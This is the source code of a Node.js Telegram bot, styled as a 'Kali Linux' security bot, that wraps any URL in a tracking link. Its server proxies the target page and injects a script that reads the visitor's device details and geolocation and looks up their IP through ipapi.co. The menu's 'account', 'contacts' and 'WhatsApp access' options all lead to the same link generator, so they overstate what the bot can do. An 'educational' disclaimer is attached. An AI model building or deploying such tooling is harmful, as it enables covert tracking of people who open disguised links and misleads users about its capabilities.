const express = require('express');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// ========== TOKEN DESDE VARIABLES DE ENTORNO ==========
const BOT_TOKEN = process.env.BOT_TOKEN;
if (!BOT_TOKEN) {
    console.error('❌ ERROR: Falta BOT_TOKEN en las variables de entorno');
    console.error('👉 Configúralo en Render: Dashboard > Web Service > Environment Variables');
    process.exit(1);
}

console.log('✅ Token cargado correctamente');

const bot = new Telegraf(BOT_TOKEN);

// ========== BASE DE DATOS EN MEMORIA ==========
const tokens = {};

function generateToken() {
    return crypto.randomBytes(6).toString('hex');
}

function createTrackLink(originalUrl) {
    const token = generateToken();
    tokens[token] = { 
        url: originalUrl, 
        timestamp: Date.now() 
    };
    // ⚠️ IMPORTANTE: Reemplaza esta URL con la de tu servidor en Render
    const baseUrl = process.env.BASE_URL || 'https://karkstrck.onrender.com/';
    return `${baseUrl}/track/${token}`;
}

// ========== RUTA PARA REDIRIGIR CON SCRIPT INYECTADO ==========
app.get('/track/:token', async (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    
    if (!data) {
        return res.status(404).send(`
            <h1>🔴 Enlace no válido</h1>
            <p>El enlace que intentas abrir no existe o ha expirado.</p>
            <p>Genera uno nuevo desde el bot de Telegram.</p>
        `);
    }
    
    try {
        const response = await fetch(data.url);
        let html = await response.text();
        
        const trackingScript = `
        <script>
            console.log('🔍 Rastreo educativo activado');
            console.log('📱 Dispositivo:', navigator.userAgent);
            console.log('📐 Resolución:', window.screen.width, 'x', window.screen.height);
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        console.log('📍 Ubicación:', pos.coords.latitude, pos.coords.longitude);
                    },
                    () => console.log('📍 Usuario denegó ubicación')
                );
            }
            
            // Capturar IP (a través de un servicio externo)
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    console.log('🌐 IP:', data.ip);
                    console.log('🌍 País:', data.country_name);
                })
                .catch(() => console.log('🌐 IP: No disponible'));
        </script>
        `;
        
        // Inyectar script antes de cerrar el <body>
        html = html.replace('</body>', trackingScript + '</body>');
        res.send(html);
        
    } catch (error) {
        console.error('Error al cargar la URL:', error);
        res.status(500).send('❌ Error al cargar la página solicitada.');
    }
});

// ========== RUTA PRINCIPAL ==========
app.get('/', (req, res) => {
    res.send(`
        <h1>🔐 Kali Bot</h1>
        <p>Bot activo y funcionando.</p>
        <p>Usa /start en Telegram para comenzar.</p>
    `);
});

// ========== COMANDOS DEL BOT ==========
bot.start(async (ctx) => {
    const msg = `🔐 *SECURITY BOT*
━━━━━━━━━━━━━━━━

$ SOCIETY$SISTEM: Access Granted ~

Bienvenido al avanzado y potente Kali Linux Bot diseñado para pruebas de penetración y fines educativos

*2da Versión* : @jsemanper
Para video /tutorial
Más Bots /bots

Selecciona una opción a continuación para comenzar`;
    
    await ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('menu', async (ctx) => {
    const keyboard = {
        inline_keyboard: [
            [{ text: '📍 Monitoreo de Dispositivo', callback_data: 'monitoreo' }],
            [{ text: '👥 Acceso a Cuentas', callback_data: 'cuentas' }],
            [{ text: '👤 Acceso a Contactos', callback_data: 'contactos' }],
            [{ text: '💬 Acceso a WhatsApp', callback_data: 'whatsapp' }],
            [{ text: '❓ Mi Información', callback_data: 'info' }]
        ]
    };
    await ctx.reply('🎯 *Selecciona una opción:*', { 
        parse_mode: 'Markdown',
        reply_markup: keyboard 
    });
});

// ========== MANEJADORES DE BOTONES ==========
async function handleGenerateLink(ctx) {
    await ctx.answerCbQuery();
    await ctx.reply('📎 *Envía la URL del sitio que quieres monitorear*\nEjemplo: https://ejemplo.com', {
        parse_mode: 'Markdown'
    });
    
    // Capturar la URL en el próximo mensaje
    bot.on('text', async (ctx) => {
        const url = ctx.message.text.trim();
        if (url.startsWith('http://') || url.startsWith('https://')) {
            const trackLink = createTrackLink(url);
            await ctx.reply(`✅ *Enlace generado:*\n${trackLink}`, {
                parse_mode: 'Markdown'
            });
        } else {
            await ctx.reply('❌ *URL inválida.* Debe comenzar con http:// o https://', {
                parse_mode: 'Markdown'
            });
        }
    });
}

bot.action('monitoreo', handleGenerateLink);
bot.action('cuentas', handleGenerateLink);
bot.action('contactos', handleGenerateLink);
bot.action('whatsapp', handleGenerateLink);

bot.action('info', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.reply(`
ℹ️ *Bot Educativo*

Este bot está diseñado para fines educativos.
No compartas enlaces sin el consentimiento explícito de las personas.

*Desarrollado por:* @jsemanper
*Versión:* 2.0
    `, { parse_mode: 'Markdown' });
});

// ========== INICIO DEL SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`🤖 Bot iniciado con token: ${BOT_TOKEN.substring(0, 10)}...`);
});

bot.launch().then(() => {
    console.log('✅ Bot conectado a Telegram');
}).catch(err => {
    console.error('❌ Error al conectar el bot:', err);
});

// ========== MANEJO DE SEÑALES ==========
process.once('SIGINT', () => {
    bot.stop('SIGINT');
    console.log('🛑 Bot detenido por SIGINT');
});
process.once('SIGTERM', () => {
    bot.stop('SIGTERM');
    console.log('🛑 Bot detenido por SIGTERM');
});